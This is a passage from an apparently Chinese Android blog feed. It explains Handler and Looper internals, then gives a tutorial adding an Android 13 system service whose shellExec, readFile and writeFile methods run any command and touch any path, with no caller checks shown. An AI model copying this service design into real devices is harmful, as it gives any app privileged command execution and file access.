&quot;</span> + msg.target + <span class="string">&quot; &quot;</span> + msg.callback);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Make sure that during the course of dispatching the</span></span><br><span class="line">        <span class="comment">// identity of the thread wasn&#x27;t corrupted.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">newIdent</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        <span class="keyword">if</span> (ident != newIdent) &#123;</span><br><span class="line">            Log.wtf(TAG, <span class="string">&quot;Thread identity changed from 0x&quot;</span></span><br><span class="line">                    + Long.toHexString(ident) + <span class="string">&quot; to 0x&quot;</span></span><br><span class="line">                    + Long.toHexString(newIdent) + <span class="string">&quot; while dispatching to &quot;</span></span><br><span class="line">                    + msg.target.getClass().getName() + <span class="string">&quot; &quot;</span></span><br><span class="line">                    + msg.callback + <span class="string">&quot; what=&quot;</span> + msg.what);</span><br><span class="line">        &#125;</span><br><span class="line">        msg.recycleUnchecked();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当获取到消息时，回调用 <strong>msg.target.dispatchMessage(msg)</strong> 即 **handler#dispatchMessage(msg)**，在 <strong>dispatchMessage(msg)</strong> 中再回调 **handleMessage(msg)**，这样就收到消息。至此发消息、收消息整个流程结束。<br>下面回答上述的问题。</p><h4 id="1、一个线程有几个Handler？"><a href="#1、一个线程有几个Handler？" class="headerlink" title="1、一个线程有几个Handler？"></a>1、一个线程有几个Handler？</h4><p>答：那个，new 多少就有多少。</p><h4 id="2、一个线程有几个Looper？如何保证？"><a href="#2、一个线程有几个Looper？如何保证？" class="headerlink" title="2、一个线程有几个Looper？如何保证？"></a>2、一个线程有几个Looper？如何保证？</h4><p>答：一个，在初始化时，使用了 ThreadLocal ，而 ThreadLocal 是一个 &lt;key,value&gt; 这种形式的变量，类似 hashMap。它的 key 是当前线程，value 是 Looper。<br>下方为对应源码分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化Looper </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span> &#123;</span><br><span class="line">        prepare(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">(<span class="type">boolean</span> quitAllowed)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sThreadLocal.get() != <span class="literal">null</span>) &#123;  <span class="comment">// 如果该线程有 Looper，则抛出一个异常。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Only one Looper may be created per thread&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 这里使用了 ThreadLocal，保证了一个线程只有一个Looper。</span></span><br><span class="line">        sThreadLocal.set(<span class="keyword">new</span> <span class="title class_">Looper</span>(quitAllowed));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ThreadLocal 的 set() 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(T value)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();  <span class="comment">// 当前线程</span></span><br><span class="line">        <span class="type">ThreadLocalMap</span> <span class="variable">map</span> <span class="operator">=</span> getMap(t);</span><br><span class="line">        <span class="keyword">if</span> (map != <span class="literal">null</span>)</span><br><span class="line">            map.set(<span class="built_in">this</span>, value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            createMap(t, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ThreadLocal 的 get()方法，</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();  <span class="comment">// 当前线程</span></span><br><span class="line">        <span class="type">ThreadLocalMap</span> <span class="variable">map</span> <span class="operator">=</span> getMap(t);</span><br><span class="line">        <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">            ThreadLocalMap.<span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> map.getEntry(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">T</span> <span class="variable">result</span> <span class="operator">=</span> (T)e.value;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> setInitialValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="3、Handler-内存泄漏原因？为什么其他的内部分没有过这个问题？"><a href="#3、Handler-内存泄漏原因？为什么其他的内部分没有过这个问题？" class="headerlink" title="3、Handler 内存泄漏原因？为什么其他的内部分没有过这个问题？"></a>3、Handler 内存泄漏原因？为什么其他的内部分没有过这个问题？</h4><p>出现内存泄漏的情况：Activity 销毁时，存在待处理的消息。例如：发送一个delay(延迟消息) 2s，在2s内销毁界面。<br>答：Handler 持有 Activity 的上下文，而 MessageQueue 持有 Message，Message 又持有 Handler；只有当这消息被处理时，才会去销毁对应的 Handler ，Handler 被销毁了，才会去销毁持有的上下文。而其他内部类，例如：RecyclerView 的 ViewHolder，不会产生内存泄漏，因为它没有被其它地方持有该内部类。<br><strong>frameworks/base/core/java/android/os/Handler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 不管使用什么方法发送消息，都会调到 Handler#enqueueMessage()</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">enqueueMessage</span><span class="params">(<span class="meta">@NonNull</span> MessageQueue queue, <span class="meta">@NonNull</span> Message msg,</span></span><br><span class="line"><span class="params">            <span class="type">long</span> uptimeMillis)</span> &#123;</span><br><span class="line">        <span class="comment">// 把当前对象赋给msg.target，这样 Message 就持有了 Handler</span></span><br><span class="line">        msg.target = <span class="built_in">this</span>;</span><br><span class="line">        msg.workSourceUid = ThreadLocalWorkSource.getUid();</span><br><span class="line">        <span class="keyword">if</span> (mAsynchronous) &#123;</span><br><span class="line">            msg.setAsynchronous(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用 MessageQueue#enqueueMessage() 往消息队列添加消息。</span></span><br><span class="line">        <span class="keyword">return</span> queue.enqueueMessage(msg, uptimeMillis);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、为何主线程可以-new-Handler？如果想要在子线程中-new-Handler-要做些什么准备？"><a href="#4、为何主线程可以-new-Handler？如果想要在子线程中-new-Handler-要做些什么准备？" class="headerlink" title="4、为何主线程可以 new Handler？如果想要在子线程中 new Handler 要做些什么准备？"></a>4、为何主线程可以 new Handler？如果想要在子线程中 new Handler 要做些什么准备？</h4><p>答：主线程在创建时，系统 ActivityThread 就已经创建好了。在子线程中 new Handler 需想初始化 Looper（Looper.prepare()），并启动 loop(Looper.loop())<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    Looper.prepareMainLooper();</span><br><span class="line">    <span class="type">long</span> <span class="variable">startSeq</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (args != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> args.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (args[i] != <span class="literal">null</span> &amp;&amp; args[i].startsWith(PROC_START_SEQ_IDENT)) &#123;</span><br><span class="line">                startSeq = Long.parseLong(</span><br><span class="line">                        args[i].substring(PROC_START_SEQ_IDENT.length()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ActivityThread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActivityThread</span>();</span><br><span class="line">    thread.attach(<span class="literal">false</span>, startSeq);</span><br><span class="line">    <span class="keyword">if</span> (sMainThreadHandler == <span class="literal">null</span>) &#123;</span><br><span class="line">        sMainThreadHandler = thread.getHandler();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">        Looper.myLooper().setMessageLogging(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">LogPrinter</span>(Log.DEBUG, <span class="string">&quot;ActivityThread&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// End of event ActivityThreadMain.</span></span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class="line">    <span class="comment">/// M: ANR Debug Mechanism</span></span><br><span class="line">    mAnrAppManager.setMessageLogger(Looper.myLooper());</span><br><span class="line">    Looper.loop();</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Main thread loop unexpectedly exited&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、子线程中的维护的-looper，消息队列无消息的时候处理方案是什么？有什么用？"><a href="#5、子线程中的维护的-looper，消息队列无消息的时候处理方案是什么？有什么用？" class="headerlink" title="5、子线程中的维护的 looper，消息队列无消息的时候处理方案是什么？有什么用？"></a>5、子线程中的维护的 looper，消息队列无消息的时候处理方案是什么？有什么用？</h4><p>答：在适当地方调用 Looper.quitSafely()；安全地退出 looper。 等所有剩余的消息处理完毕后立即终止。但是，在 loop 循环终止之前，将不会在收到消息。在要求循环程序退出后，任何向队列发送消息的尝试都将失败。</p><h4 id="6、既然可以存在多个-Handler-往-MessageQueue-中添加数据（发消息时，各个handler-可能处于不同的线程），那么它内部是如何确保线程安全的？"><a href="#6、既然可以存在多个-Handler-往-MessageQueue-中添加数据（发消息时，各个handler-可能处于不同的线程），那么它内部是如何确保线程安全的？" class="headerlink" title="6、既然可以存在多个 Handler 往 MessageQueue 中添加数据（发消息时，各个handler 可能处于不同的线程），那么它内部是如何确保线程安全的？"></a>6、既然可以存在多个 Handler 往 MessageQueue 中添加数据（发消息时，各个handler 可能处于不同的线程），那么它内部是如何确保线程安全的？</h4><p>答：在 MessageQueue#enqueueMessage、MessageQueue#next() 中的代码块使用了 synchronized 修饰。则也会导致 handler 的 delay 消息的时间不完全的准确。</p><h4 id="7、我们使用-Message-时应如何创建它？"><a href="#7、我们使用-Message-时应如何创建它？" class="headerlink" title="7、我们使用 Message 时应如何创建它？"></a>7、我们使用 Message 时应如何创建它？</h4><p>答：obtain()，避免了每次去 new ，防止了内存抖动。</p><h4 id="8、使用-Handler-的-postDelay-后，消息队列会有什么变化？"><a href="#8、使用-Handler-的-postDelay-后，消息队列会有什么变化？" class="headerlink" title="8、使用 Handler 的 postDelay 后，消息队列会有什么变化？"></a>8、使用 Handler 的 postDelay 后，消息队列会有什么变化？</h4><p>答：若此时消息队列为空，则不会立马执行(Delay 消息)；当该消息添加进去时，MessageQueue#enqueueMessage 会 调用 nativeWake(mPtr) 唤醒消息队列，就会在 MessageQueue#next() 中，计算等待时间。</p><h4 id="9、Looper-死循环为什么不会导致应用卡死-ANR"><a href="#9、Looper-死循环为什么不会导致应用卡死-ANR" class="headerlink" title="9、Looper 死循环为什么不会导致应用卡死(ANR)?"></a>9、Looper 死循环为什么不会导致应用卡死(ANR)?</h4><p>每一个事件都是一个 Message，因为所有事件都在Activity的生命周期里面，而主线程的所有代码都运行在 ActivityThread#main()中的 loop 里面。所以主线程的 loop 不能退出。<br>主线程唤醒的方式;<br>1、输入的事件；<br>2、Looper 添加消息；<br>输入事件：点击屏幕或按键按下，得到系统响应。<br>答：ANR是指在5s内没有响应输入事件（例如：按键按下、屏幕触摸），而输入的事件、Looper 添加消息都可以唤醒 Looper 里面的 block。Looper 死循环 与 ANR没有关系。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13源码添加系统服务</title>
      <link href="/2023/11/04/2023-11-04/"/>
      <url>/2023/11/04/2023-11-04/</url>
      
        <content type="html"><![CDATA[<p>本文基于Android 13的framework层添加系统接口，为应用层提供读写函数、以及执行命令!</p><h3 id="添加接口"><a href="#添加接口" class="headerlink" title="添加接口"></a>添加接口</h3><p><strong>frameworks/base/core/java/android/app/IDevices.aidl</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.app;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IDevices</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//读取文件</span></span><br><span class="line">    String <span class="title function_">readFile</span><span class="params">(String path)</span>;</span><br><span class="line">    <span class="comment">//写入文件</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String path,String data)</span>;</span><br><span class="line">    <span class="comment">//执行shell命令</span></span><br><span class="line">    String <span class="title function_">shellExec</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加系统服务的Manager"><a href="#添加系统服务的Manager" class="headerlink" title="添加系统服务的Manager"></a>添加系统服务的Manager</h3><p><strong>frameworks/base/core/java/android/app/DevicesManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> android.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.annotation.SystemService;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;</span><br><span class="line"><span class="keyword">import</span> android.util.Slog;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SystemService(Context.DEVICES_SERVICE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DevicesManager</span> &#123;</span><br><span class="line">    Context mContext;</span><br><span class="line">    IDevices mService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DevicesManager</span><span class="params">(Context context,IDevices service)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(service==<span class="literal">null</span>)&#123;</span><br><span class="line">            Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;Construct service is null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mContext = context;</span><br><span class="line">        mService = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">shellExec</span><span class="params">(String cmd)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(mService != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;shellExec&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> mService.shellExec(cmd);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(RemoteException e)&#123;</span><br><span class="line">                Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;RemoteException &quot;</span>+e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;mService is null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">readFile</span><span class="params">(String path)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(mService != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;readFile&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> mService.readFile(path);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(RemoteException e)&#123;</span><br><span class="line">                Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;RemoteException &quot;</span>+e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;mService is null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String path,String data)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(mService != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;writeFile&quot;</span>);</span><br><span class="line">                mService.writeFile(path,data);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(RemoteException e)&#123;</span><br><span class="line">                Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;RemoteException &quot;</span>+e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Slog.e(<span class="string">&quot;DevicesManager&quot;</span>,<span class="string">&quot;mService is null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加系统服务，实现aidl文件的接口"><a href="#添加系统服务，实现aidl文件的接口" class="headerlink" title="添加系统服务，实现aidl文件的接口"></a>添加系统服务，实现aidl文件的接口</h3><p><strong>frameworks/base/services/core/java/com/android/server/DevicesService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.android.server; </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.IDevices;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.util.Slog;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> libcore.io.IoUtils;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DevicesService</span> <span class="keyword">extends</span> <span class="title class_">IDevices</span>.Stub &#123;</span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line">    <span class="keyword">private</span> String TAG=<span class="string">&quot;DevicesService&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DevicesService</span><span class="params">(Context context)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        mContext = context;</span><br><span class="line">        Slog.d(TAG,<span class="string">&quot;Construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">shellExec</span><span class="params">(String cmd)</span>&#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">mRuntime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//Process中封装了返回的结果和执行错误的结果</span></span><br><span class="line">            Slog.d(TAG,<span class="string">&quot;shellExec data:&quot;</span>+cmd);</span><br><span class="line">            <span class="type">Process</span> <span class="variable">mProcess</span> <span class="operator">=</span> mRuntime.exec(cmd);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">mReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(mProcess.getInputStream()));</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">mRespBuff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">            <span class="type">char</span>[] buff = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((ch = mReader.read(buff)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                mRespBuff.append(buff, <span class="number">0</span>, ch);</span><br><span class="line">            &#125;</span><br><span class="line">            mReader.close();</span><br><span class="line">            <span class="keyword">return</span> mRespBuff.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            Slog.d(TAG,<span class="string">&quot;shellExec err:&quot;</span>+e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title 